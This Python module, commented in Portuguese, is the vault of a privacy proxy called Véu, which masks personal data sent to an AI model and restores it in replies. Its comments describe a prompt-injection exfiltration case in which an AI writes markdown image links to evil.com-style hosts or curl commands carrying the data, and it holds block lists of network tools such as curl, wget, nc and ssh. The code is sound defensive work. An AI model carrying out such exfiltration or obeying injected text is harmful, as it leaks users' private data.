"""Cofre: guarda o mapeamento entre os marcadores e os dados reais e restaura textos.

O cofre fica só na memória do processo (ou no arquivo que você salvar pela CLI) e nunca é
enviado ao modelo de IA.
"""

from __future__ import annotations

import contextlib
import contextvars
import hashlib
import hmac
import json
import os
import random
import re
import threading
from collections import Counter
from dataclasses import dataclass

from veu._text import fold, only_digits
from veu.entities import LABELS, SECRET_LABELS

# Rótulos cujos valores são comparados só pelos dígitos ("529.982.247-25" e "52998224725" são o mesmo CPF).
DIGIT_LABELS = frozenset({
    "CPF", "TELEFONE", "CEP", "CARTAO_CREDITO", "PIS", "CNS", "CNH", "TITULO_ELEITOR", "RENAVAM",
    "CONTA_BANCARIA", "PROCESSO", "NIF_PT", "NISS_PT", "CUIT", "DNI", "NIT", "RUC", "CEDULA", "NUIT", "SSN",
    "STEUER_ID", "NHS", "BSN", "SIN", "AADHAAR", "PORTA", "REGISTRO_PROFISSIONAL", "CADASTRO",
})
CODE_LABELS = frozenset({"CNPJ", "RG", "PLACA", "PASSAPORTE", "CHAVE_PIX", "CC_PT", "CURP", "RFC", "RUT", "RIF",
                         "BI_AO", "BI_MZ", "MBI", "DNI_ES", "CODICE_FISCALE", "NIR", "NINO", "PAN", "VIN", "CTPS", "MAC"})

# O colchete final é opcional: modelos às vezes escrevem "[CPF_1" ou "[CPF 1]".
_PLACEHOLDER = r"\[\s*(?P<ph_label>[A-Za-z]+(?:_[A-Za-z]+)*)[_\s-]+(?P<ph_id>[0-9A-Fa-f]{1,16})(?:\s*\]|(?![\w]))"
_BARE = r"(?<![\w\[])(?P<bare_label>[A-Z]+(?:_[A-Z]+)*)_(?P<bare_id>\d{1,6}|[0-9a-f]{16}|[0-9a-f]{8})(?![\w\]])"
# Marcadores que já chegam no texto de entrada (escritos por uma página, um e-mail ou um documento).
_FORGED = re.compile(
    r"\[(?P<open>\s*)(?P<label>[A-Za-z]+(?:_[A-Za-z]+)*)(?P<sep>[_\s-]+)(?P<id>[0-9A-Fa-f]{1,16})(?=\s*\]|(?![\w]))"
)
_BARE_IN_INPUT = re.compile(_BARE)
_TRAILING_WORD = re.compile(r"[A-Za-z0-9_]+$")
_DIGIT_SEPARATOR = r"[\s.\-/()]*"
MAX_HOLDBACK = 48
HASH_HEX = 16  # 64 bits no operador hash


# Ferramentas que levam dados para fora (rede, mensagens, publicação): não recebem dados reais nos argumentos.
# O nome da ferramenta é quebrado em palavras ("WebFetch" -> web, fetch; "send_email" -> send, email), então
# "postgres_query" não é confundido com "post".
NETWORK_TOOL_WORDS = (
    "fetch", "http", "https", "request", "url", "browse", "browser", "navigate", "web", "email", "mail", "gmail",
    "outlook", "send", "post", "webhook", "upload", "slack", "discord", "telegram", "whatsapp", "sms", "message",
    "tweet", "publish", "share", "notify", "curl", "wget",
)
_TOOL_WORD = re.compile(r"[A-Z]+(?![a-z])|[A-Z]?[a-z]+|\d+")
# Comandos que mandam dados pela rede: num argumento de ferramenta, o dado real não vai depois deles na mesma linha
# (vale também para o corpo, como em curl -d "cpf=[CPF_1]", e não só para a URL).
_NETWORK_COMMAND = re.compile(
    r"(?i)(?<![\w.-])(?:curl|wget|nc|ncat|netcat|telnet|ftp|sftp|scp|ssh|rsync|invoke-webrequest|invoke-restmethod"
    r"|iwr|irm|start-bitstransfer|sendmail|mutt)(?![\w-])"
)


def tool_words(name: str) -> set[str]:
    return {word.lower() for word in _TOOL_WORD.findall(name)}


@dataclass(frozen=True, slots=True)
class RestorePolicy:
    """Onde a restauração pode devolver os dados reais.

    links: restaura também dentro de links, imagens e URLs. Desligado por padrão: um texto malicioso lido
        pela IA pode pedir que ela escreva ![x](https://site/?d=[CPF_1]), e o navegador enviaria o CPF real.
    link_hosts: domínios (e subdomínios) cujos links podem receber os dados reais mesmo assim.
    tools: restaura os argumentos das chamadas de ferramenta (o que o agente vai executar).
    secrets_in_tools: restaura chaves de API, tokens e senhas nesses argumentos. Desligado por padrão.
    tools_without_data: palavras de nomes de ferramentas que nunca recebem dados reais (rede, mensagens).
    tools_with_data: se preenchida, só estas ferramentas (pelo nome exato) recebem dados reais.
    """

    links: bool = False
    link_hosts: tuple[str, ...] = ()
    tools: bool = True
    secrets_in_tools: bool = False
    # Máximo de valores reais devolvidos numa resposta pelo proxy (0: sem limite). Uma IA manipulada que tenta
    # despejar todos os dados da sessão para ao chegar no limite.
    max_per_response: int = 0
    tools_without_data: tuple[str, ...] = NETWORK_TOOL_WORDS
    tools_with_data: tuple[str, ...] = ()

    def tool_allowed(self, name: str) -> bool:
        """A ferramenta com este nome pode receber dados reais nos argumentos?"""
        allowed = {item.lower() for item in self.tools_with_data}
        if name.lower() in allowed:
            return True
        if allowed:
            return False
        return not tool_words(name) & {word.lower() for word in self.tools_without_data}

    def allows(self, label: str, before: str, *, tool: bool, tool_name: str | None = None) -> bool:
        """Pode restaurar um valor do tipo label, precedido por before (o texto da mesma linha)?

        tool_name: o nome da ferramenta, quando o texto é argumento de uma chamada (send_email, Bash...).
        """
        if tool:
            if not self.tools or (label in SECRET_LABELS and not self.secrets_in_tools):
                return False
            if tool_name and not self.tool_allowed(tool_name):
                return False
            if _NETWORK_COMMAND.search(re.split(r"\\n|\n", before)[-1]):
                return False
        if self.links:
            return True
        url = link_context(before)
        if url is None:
            return True
        host = url_host(url)
        return bool(host) and any(host == domain or host.endswith("." + domain) for domain in self.link_hosts)


# Começo de uma URL ou de um destino de link no texto que antecede o marcador.
# O último caso é um domínio solto seguido de "/" (evil.com/?d=...), que muitos sites transformam em link.
_URL_START = re.compile(
    r"(?i)\b[a-z][a-z0-9+.\-]*://|\bwww\.|\bmailto:|\]\(\s*<?|(?<![:/\w])//"
    r"|\b[a-z0-9\-]+(?:\.[a-z0-9\-]+)*\.[a-z]{2,24}(?::\d{1,5})?/"
)
_LINK_ATTRIBUTE_NAME = re.compile(
    r"(?i)(?<!\w)(?:src|href|action|formaction|srcset|poster|ping|cite|background|lowsrc|data)$"
)
_ANGLE_OPEN = re.compile(r"\]\(\s*<")
_RUN_CHARS = re.compile(r"[^\s\"'<>`]*")
# Um trecho sem espaços maior que isto logo antes do marcador (base64, código minificado) não é analisado: o marcador
# fica como está, que é o lado seguro, e o custo não cresce com o quadrado do tamanho da linha.
MAX_RUN = 2048
_HOST = re.compile(r"(?i)^(?:[a-z][a-z0-9+.\-]*:)?//([^/?#\\\s]*)[/?#\\]")
_JSON_ESCAPE = re.compile(r"\\u([0-9a-fA-F]{4})|\\(/)")


_restored: contextvars.ContextVar[Counter | None] = contextvars.ContextVar("veu_restored", default=None)


@contextlib.contextmanager
def count_restorations(counter: Counter):
    """Conta, por tipo, os valores reais devolvidos enquanto o bloco roda (o proxy usa por resposta)."""
    token = _restored.set(counter)
    try:
        yield counter
    finally:
        _restored.reset(token)


def link_context(before: str) -> str | None:
    """Se o marcador está dentro de um link, imagem ou URL, devolve a URL até ele; senão, None.

    Roda uma vez por marcador: nada aqui varre a linha inteira em Python, para a restauração não ficar quadrática
    numa linha longa com muitos marcadores.
    """
    line = before[before.rfind("\n") + 1:]
    if "\\" in line:  # argumentos de ferramenta em JSON: "https:\/\/..." ou "/"
        cut = max(0, len(line) - 4 * MAX_RUN)
        line = line[:cut] + _JSON_ESCAPE.sub(lambda m: chr(int(m.group(1), 16)) if m.group(1) else "/", line[cut:])
    # Destino entre < > ("[x](<https://site/a b>)"), que aceita espaços: o primeiro "](<" depois do último ">".
    opener = line.find("](", line.rfind(">") + 1)
    angle = _ANGLE_OPEN.search(line, opener) if opener != -1 else None
    if angle:
        return line[angle.end():]
    # Ainda dentro do destino de um link Markdown ("[x](javascript:fetch('...'+'[CPF_1]')") ou do valor de um atributo
    # HTML (href="...'+'[CPF_1]"): aspas e "+" no caminho não tiram o marcador do link. Com a linha em branco antes do
    # marcador, vale a linha de cima ("[x](https://site/?d=" e o marcador embaixo).
    inside = _open_link(line)
    if inside is None and not line.strip() and "\n" in before:
        above = before[:before.rfind("\n")]
        inside = _open_link(above[above.rfind("\n") + 1:])
    if inside is not None:
        return inside
    run = _trailing_run(line)
    if len(run) > MAX_RUN:
        return run  # sem esquema nem domínio reconhecível, url_host() fica vazio e o marcador não é restaurado
    start = _URL_START.search(run)
    if start:
        return run[start.end():] if start.group(0).startswith("]") else run[start.start():]
    if _ends_with_link_attribute(line[:len(line) - len(run)]):
        return run
    return None


def _open_link(line: str) -> str | None:
    """O destino de link Markdown ou o valor de atributo de link ainda aberto no fim da linha, ou None."""
    opener = line.rfind("](")
    if opener != -1:
        rest = line[opener + 2:]
        if rest.count("(") + 1 > rest.count(")"):
            return rest
    for quote in "\"'":
        if line.count(quote) % 2:
            position = line.rfind(quote)
            if _ends_with_link_attribute(line[:position]):
                return line[position + 1:]
    return None


def _ends_with_link_attribute(text: str) -> bool:
    """O texto termina num atributo de link (src=, href=, url( ...), com ou sem aspa? Olha só o fim, sem limite de
    espaços: "src      =   " também conta."""
    end = len(text)
    if end and text[end - 1] in "\"'":
        end -= 1
    while end and text[end - 1].isspace():
        end -= 1
    if end and text[end - 1] == "=":
        end -= 1
        while end and text[end - 1].isspace():
            end -= 1
        return _LINK_ATTRIBUTE_NAME.search(text, max(0, end - 16), end) is not None
    if end >= 4 and text[end - 4:end].lower() == "url(":
        return end == 4 or not (text[end - 5].isalnum() or text[end - 5] == "_")
    return False


def _trailing_run(line: str) -> str:
    """O trecho final da linha sem espaços, aspas, < > ou crase. Varre do fim e para logo depois de MAX_RUN.

    Passar de MAX_RUN já basta para não restaurar; varrer até o começo deixava a restauração quadrática num texto
    sem espaços com muitos marcadores ("[IP_1].[IP_1]..." travava o proxy por segundos).
    """
    tail = line[max(0, len(line) - MAX_RUN - 1):]
    # Casa o começo do trecho invertido: a mesma varredura do fim para o começo, feita pela regex (em C).
    length = _RUN_CHARS.match(tail[::-1]).end()
    return tail[len(tail) - length:]


def url_host(url: str) -> str:
    """Domínio de uma URL absoluta, só se ele já terminou (vazio se o marcador está no próprio domínio)."""
    match = _HOST.match(url)
    if not match:
        return ""
    return match.group(1).rsplit("@", 1)[-1].split(":", 1)[0].lower().rstrip(".")


def neutralize_placeholders(text: str, labels: set[str] | frozenset[str] = frozenset()) -> str:
    """Desarma marcadores que já vêm no texto de entrada: [CPF_1] vira [CPF#1].

    Só o Véu cria marcadores. Um marcador escrito por outra pessoa (numa página, num e-mail, num documento)
    não pode virar um dado real quando a IA o repete na resposta.
    """
    if "[" not in text:
        return text

    def replace(match: re.Match) -> str:
        label = match.group("label").upper()
        if label not in LABELS and label not in labels:
            return match.group(0)
        return f"[{match.group('open')}{match.group('label')}{'#' * len(match.group('sep'))}{match.group('id')}"

    return _FORGED.sub(replace, text)


def normalize_value(label: str, value: str) -> str:
    """Forma canônica de um valor, usada para dar o mesmo marcador a grafias diferentes."""
    if label == "TELEFONE":
        digits = only_digits(value)
        return digits[2:] if len(digits) in (12, 13) and digits.startswith("55") else digits
    if label in DIGIT_LABELS:
        return only_digits(value) or fold(value)
    if label in CODE_LABELS:
        return re.sub(r"[^0-9A-Za-z]", "", value).upper()
    if label == "EMAIL":
        return value.strip().casefold()
    return fold(value)


@dataclass(frozen=True, slots=True)
class VaultEntry:
    label: str
    original: str
    replacement: str
    kind: str  # "marcador" ou "sintetico"


class Vault:
    """Mapeamento reversível entre dados reais e o que foi enviado ao modelo."""

    def __init__(self, secret: bytes | None = None, seed: int | None = None, policy: RestorePolicy | None = None):
        self._by_key: dict[tuple[str, str], str] = {}
        self._entries: dict[str, VaultEntry] = {}
        self._counters: Counter[str] = Counter()
        self._secret = secret or os.urandom(32)
        self.policy = policy or RestorePolicy()
        self.rng = random.Random(seed)
        self._pattern: re.Pattern | None = None
        self._digit_surrogates: dict[str, VaultEntry] = {}
        self._text_surrogates: dict[str, VaultEntry] = {}
        # Marcadores soltos ("CPF_1", sem colchetes) que já vieram no texto de entrada: nunca são restaurados.
        self._forged_bare: set[str] = set()
        # Cofres de sessão são usados por várias requisições ao mesmo tempo: sem a trava, duas
        # requisições poderiam dar o mesmo [CPF_2] a valores diferentes.
        self._lock = threading.RLock()

    # Criação de marcadores
    def lookup(self, label: str, value: str) -> str | None:
        return self._by_key.get((label, normalize_value(label, value)))

    def placeholder(self, label: str, value: str, *, hashed: bool = False) -> str:
        key = (label, normalize_value(label, value))
        with self._lock:
            existing = self._by_key.get(key)
            if existing is not None:
                return existing
            if hashed:
                replacement = f"[{label}_{self.hash_id(label, key[1])}]"
                if replacement in self._entries:  # colisão de 64 bits: improvável, mas nunca troca uma pessoa por outra
                    raise ValueError(f"Colisão no operador hash para {label}. Use outro VEU_SEGREDO.")
            else:
                self._counters[label] += 1
                replacement = f"[{label}_{self._counters[label]}]"
            self._store(key, VaultEntry(label, value, replacement, "marcador"))
            return replacement

    def hash_id(self, label: str, normalized: str) -> str:
        """HMAC-SHA256 com uma chave derivada só para o operador hash (64 bits na saída)."""
        key = hmac.new(self._secret, b"veu/hash/v2", hashlib.sha256).digest()
        return hmac.new(key, f"{label}:{normalized}".encode(), hashlib.sha256).hexdigest()[:HASH_HEX]

    def surrogate(self, label: str, value: str, make) -> str:
        """Substituto sintético e verossímil (por exemplo, outro CPF válido). make(rng) gera o valor."""
        key = (label, normalize_value(label, value))
        with self._lock:
            existing = self._by_key.get(key)
            if existing is not None:
                return existing
            taken = {fold(entry.original) for entry in self._entries.values()} | {fold(r) for r in self._entries}
            for _ in range(20):
                replacement = make(self.rng)
                if replacement and fold(replacement) not in taken and fold(replacement) != fold(value):
                    break
            else:
                return self.placeholder(label, value)
            self._store(key, VaultEntry(label, value, replacement, "sintetico"))
            return replacement

    def alias(self, label: str, value: str, replacement: str) -> None:
        """Faz outro valor (por exemplo, só o primeiro nome) usar um marcador já existente."""
        with self._lock:
            self._by_key.setdefault((label, normalize_value(label, value)), replacement)

    def _store(self, key: tuple[str, str], entry: VaultEntry) -> None:
        self._by_key[key] = entry.replacement
        self._entries[entry.replacement] = entry
        if entry.kind == "sintetico":
            if entry.label in DIGIT_LABELS:
                self._digit_surrogates[only_digits(entry.replacement)] = entry
            else:
                self._text_surrogates[fold(entry.replacement)] = entry
        self._pattern = None

    # Consulta
    def __len__(self) -> int:
        return len(self._entries)

    def __bool__(self) -> bool:
        return True

    def entries(self) -> list[VaultEntry]:
        return list(self._entries.values())

    def neutralize(self, text: str) -> str:
        """Desarma os marcadores que já vêm no texto de entrada, antes de o Véu inserir os seus.

        "[CPF_1]" vira "[CPF#1]". Um "CPF_1" solto não é reescrito (pode ser um nome no código, como TOKEN_1),
        mas fica marcado: a forma solta nunca mais é restaurada neste cofre; só "[CPF_1]", que só o Véu cria.
        """
        labels = self.labels
        found = {f"[{m.group('bare_label')}_{m.group('bare_id')}]" for m in _BARE_IN_INPUT.finditer(text)
                 if m.group("bare_label") in LABELS or m.group("bare_label") in labels}
        if found:
            with self._lock:
                self._forged_bare |= found
        return neutralize_placeholders(text, labels)

    @property
    def labels(self) -> set[str]:
        return {entry.label for entry in self._entries.values()}

    @property
    def has_placeholders(self) -> bool:
        return any(entry.kind == "marcador" for entry in self._entries.values())

    # Restauração
    def _compiled(self) -> re.Pattern:
        with self._lock:
            return self._build_pattern()

    def _build_pattern(self) -> re.Pattern:
        if self._pattern is None:
            parts = [_PLACEHOLDER, _BARE]
            surrogates = []
            for entry in self._entries.values():
                if entry.kind != "sintetico":
                    continue
                if entry.label in DIGIT_LABELS:
                    digits = only_digits(entry.replacement)
                    surrogates.append(r"(?<!\d)" + _DIGIT_SEPARATOR.join(digits) + r"(?!\d)")
                else:
                    words = [re.escape(word) for word in entry.replacement.split()]
                    surrogates.append(r"(?<![\w@.])(?i:" + r"\s+".join(words) + r")(?![\w@])")
            if surrogates:
                surrogates.sort(key=len, reverse=True)
                parts.append("(?P<sur>" + "|".join(surrogates) + ")")
            self._pattern = re.compile("|".join(parts))
        return self._pattern

    def _entry_for(self, match: re.Match) -> VaultEntry | None:
        if match.group("ph_label"):
            key = f"[{match.group('ph_label').upper()}_{match.group('ph_id').lower()}]"
        elif match.group("bare_label"):
            key = f"[{match.group('bare_label')}_{match.group('bare_id')}]"
            if key in self._forged_bare:
                return None
        else:
            text = match.group(0)
            return self._digit_surrogates.get(only_digits(text)) or self._text_surrogates.get(fold(text))
        entry = self._entries.get(key)
        return entry if entry and entry.kind == "marcador" else None

    def restore(self, text: str, *, json_escape: bool = False, tool: bool | None = None, prefix: str = "",
                tool_name: str | None = None) -> str:
        """Troca marcadores e substitutos pelos valores reais, seguindo a política do cofre (self.policy).

        json_escape: o texto é um pedaço de JSON. tool: o texto é argumento de uma chamada de ferramenta
        (padrão: o mesmo que json_escape). prefix: o texto da mesma linha que já passou (streaming).
        tool_name: o nome da ferramenta chamada, para a política decidir se ela recebe dados reais.
        Dentro de links e URLs, e para segredos em argumentos de ferramentas, o marcador fica como está.
        """
        if not text or not self._entries:
            return text
        tool = json_escape if tool is None else tool
        policy = self.policy
        counter = _restored.get()
        # O último caractere já emitido (streaming) entra só como contexto: "_" + "CPF_1" não é um marcador solto.
        lead = prefix[-1:]

        def replace(match: re.Match) -> str:
            if match.start() < len(lead):
                return match.group(0)
            entry = self._entry_for(match)
            if entry is None:
                return match.group(0)
            start = match.start() - len(lead)
            # A linha do marcador e a de cima: um link aberto na linha de cima ainda conta ("[x](https://site/?d=" e
            # o marcador sozinho na linha de baixo).
            newline = text.rfind("\n", 0, start)
            above = text.rfind("\n", 0, newline) if newline != -1 else -1
            before = prefix + text[:start] if above == -1 else text[above + 1:start]
            if not policy.allows(entry.label, before, tool=tool, tool_name=tool_name):
                return match.group(0)
            if counter is not None:
                if policy.max_per_response and sum(counter.values()) >= policy.max_per_response:
                    return match.group(0)
                counter[entry.label] += 1
            return json.dumps(entry.original, ensure_ascii=False)[1:-1] if json_escape else entry.original

        return self._compiled().sub(replace, lead + text)[len(lead):]

    def restore_spans(self, text: str) -> list[tuple[int, int, str]]:
        """(início, fim, valor real) de cada marcador que a política deixa restaurar (para documentos)."""
        spans = []
        for match in self._compiled().finditer(text):
            entry = self._entry_for(match)
            if entry is None:
                continue
            newline = text.rfind("\n", 0, match.start())
            if self.policy.allows(entry.label, text[newline + 1:match.start()], tool=False):
                spans.append((match.start(), match.end(), entry.original))
        return spans

    def restorer(self, *, json_escape: bool = False, tool: bool | None = None,
                 tool_name: str | None = None) -> StreamRestorer:
        return StreamRestorer(self, json_escape=json_escape, tool=tool, tool_name=tool_name)

    def scoped(self, keys) -> Vault:
        """Cópia só com os marcadores de keys, para restaurar uma resposta (modo só eco). Nunca é guardada."""
        view = Vault(secret=self._secret, policy=self.policy)
        with self._lock:
            for key in keys:
                entry = self._entries.get(key)
                if entry is not None:
                    view._store((entry.label, normalize_value(entry.label, entry.original)), entry)
            view._forged_bare = set(self._forged_bare)
        return view

    def _might_continue(self, tail: str) -> bool:
        """O fim do texto pode ser o começo de um marcador ou substituto que chega no próximo pedaço?"""
        upper = tail.upper()
        if _TRAILING_WORD.fullmatch(tail):
            for label in self.labels:
                prefix = label + "_"
                if prefix.startswith(upper) or upper.startswith(prefix):
                    return True
        folded = fold(tail)
        if folded and any(surrogate.startswith(folded) for surrogate in self._text_surrogates):
            return True
        digits = only_digits(tail)
        if digits and re.fullmatch(r"[\d\s.\-/()]+", tail):
            return any(surrogate.startswith(digits) for surrogate in self._digit_surrogates)
        return False

    def max_surrogate_length(self) -> int:
        return max((len(entry.replacement) for entry in self._entries.values() if entry.kind == "sintetico"),
                   default=0)

    # Persistência (a CLI salva o cofre para restaurar depois). O arquivo contém os dados reais.
    def to_dict(self) -> dict:
        return {
            "versao": 1,
            "itens": [
                {"entidade": e.label, "original": e.original, "substituto": e.replacement, "tipo": e.kind}
                for e in self._entries.values()
            ],
            "chaves": [{"entidade": label, "valor": value, "substituto": rep} for (label, value), rep in self._by_key.items()],
            **({"forjados": sorted(self._forged_bare)} if self._forged_bare else {}),
        }

    @classmethod
    def from_dict(cls, data: dict, *, secret: bytes | None = None, policy: RestorePolicy | None = None) -> Vault:
        vault = cls(secret=secret, policy=policy)
        for item in data.get("itens", []):
            entry = VaultEntry(item["entidade"], item["original"], item["substituto"], item.get("tipo", "marcador"))
            vault._store((entry.label, normalize_value(entry.label, entry.original)), entry)
            match = re.fullmatch(r"\[[A-Z_]+_(\d+)\]", entry.replacement)
            if match:
                vault._counters[entry.label] = max(vault._counters[entry.label], int(match.group(1)))
        for item in data.get("chaves", []):
            vault._by_key.setdefault((item["entidade"], item["valor"]), item["substituto"])
        vault._forged_bare = {str(key) for key in data.get("forjados", [])}
        return vault


def _word_char(char: str) -> bool:
    return char.isalnum() or char == "_"


class StreamRestorer:
    """Restaura uma resposta que chega em pedaços (streaming).

    Um marcador pode chegar dividido ("[PES" + "SOA_1]"): o fim de cada pedaço que ainda pode
    virar um marcador fica retido até o próximo pedaço, ou até flush().
    """

    def __init__(self, vault: Vault, *, json_escape: bool = False, tool: bool | None = None,
                 tool_name: str | None = None):
        self.vault = vault
        self.json_escape = json_escape
        self.tool = json_escape if tool is None else tool
        self.tool_name = tool_name
        self._buffer = ""
        # Texto já emitido na linha atual: um link pode começar num pedaço e o marcador chegar em outro.
        self._line = ""

    def _restore(self, ready: str) -> str:
        output = self.vault.restore(ready, json_escape=self.json_escape, tool=self.tool, prefix=self._line,
                                    tool_name=self.tool_name)
        # Guarda a linha atual e a de cima, como a restauração sem streaming vê.
        combined = self._line + ready
        last = combined.rfind("\n")
        if last != -1:
            combined = combined[combined.rfind("\n", 0, last) + 1:]
        self._line = combined
        return output

    def feed(self, text: str) -> str:
        if not text:
            return ""
        self._buffer += text
        cut = self._safe_cut(self._buffer)
        ready, self._buffer = self._buffer[:cut], self._buffer[cut:]
        return self._restore(ready)

    def flush(self) -> str:
        ready, self._buffer = self._buffer, ""
        return self._restore(ready)

    @property
    def pending(self) -> bool:
        return bool(self._buffer)

    def _safe_cut(self, text: str) -> int:
        cut = len(text)
        bracket = text.rfind("[")
        if bracket != -1 and "]" not in text[bracket:] and len(text) - bracket <= MAX_HOLDBACK:
            cut = bracket
        longest = min(len(text), max(MAX_HOLDBACK, self.vault.max_surrogate_length()))
        for size in range(longest, 0, -1):
            start = len(text) - size
            if start >= cut:
                break
            # No meio de uma palavra ("_CPF_1", "xCPF_1"), um marcador solto não começa: cortar ali separaria o
            # marcador do que vem antes, e ele seria restaurado no pedaço seguinte sem esse contexto.
            if start > 0 and _word_char(text[start - 1]) and _word_char(text[start]):
                continue
            if self.vault._might_continue(text[start:]):
                cut = start
                break
        return cut
